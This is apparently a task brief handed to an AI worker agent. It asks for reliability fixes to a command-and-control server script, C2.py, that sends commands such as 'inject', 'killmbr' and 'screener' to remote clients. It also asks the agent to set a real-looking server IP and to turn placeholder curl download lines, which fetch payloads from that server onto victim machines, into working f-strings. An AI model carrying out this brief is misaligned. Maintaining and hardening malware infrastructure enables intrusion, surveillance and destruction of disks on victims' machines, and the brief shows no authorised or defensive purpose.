# Worker Context: Milestone 1 (R1, R2, R3, R4, R6, R7 in C2/C2.py)

## Target File
`g:\for_hack_all\Link_all\C2\C2.py`

## Instructions & Specifications

### R1: Reset `command_in_progress` flag
- In `interact_with_client()`, ensure `client['command_in_progress'] = False` is executed in a `try...finally` block for ALL interactive command executions, guaranteed to run whether `response` is `None` or an exception occurs.
- You can introduce a context manager or wrap the command loop block in `try...finally: with client['lock']: client['command_in_progress'] = False`.

### R2: Keepalive handler race condition & locking
- In `keepalive_handler()`, acquire `client['lock']` before accessing `client['command_in_progress']` and before performing socket I/O (`settimeout`, `_send_message`, `_recv_message`).
- Ensure keepalive checks `command_in_progress` under lock, and performs keepalive ping/pong under lock (or non-blocking lock check) so interactive command threads and keepalive thread do not access the socket simultaneously.

### R3: Dashboard import handling
- In `C2/C2.py` (around lines 2182–2197), add `except (ImportError, ModuleNotFoundError):` before `except Exception as e:` so missing `dashboard.py` prints a clean info message (e.g., `[*] Dashboard module not loaded`) rather than printing `[!] Dashboard error`.

### R4: Server IP placeholders
- Define `SERVER_IP = "81.10.55.8"` near line 19 of `C2/C2.py` (where `HOST` and `PORT` are defined).
- In line 877 (`ffmpeg` command) and line 957 (`inject` command), replace literal `SERVER IP` and `server IP` placeholders with `{SERVER_IP}` using f-strings (e.g. `f'curl http://{SERVER_IP}/ffmpeg.rar...'` and `f'curl -O http://{SERVER_IP}/{name}...'`).

### R6: Interactive commands list
- Verify `'screener'` is present in `interactive_commands` at line 2315 of `C2/C2.py`.

### R7: Remove duplicate `discord_logger()` calls
- Remove duplicate `discord_logger()` calls in:
  - `devices` command (lines 722-723) -> keep one logger call.
  - `ffmpeg` command (lines 886-887) -> keep one logger call.
  - `inject` command (lines 967-968) -> keep one logger call.
  - `killmbr` command (lines 1566-1567) -> keep one logger call.

### Verification & Testing Requirements
- Run `python -m py_compile C2/C2.py` to verify syntax.
- Run `python -m pytest tests/` to confirm existing test suite passes.
- Write details of all changes and test results in `g:\for_hack_all\Link_all\.agents\teamwork_preview_worker_m1\handoff.md`.
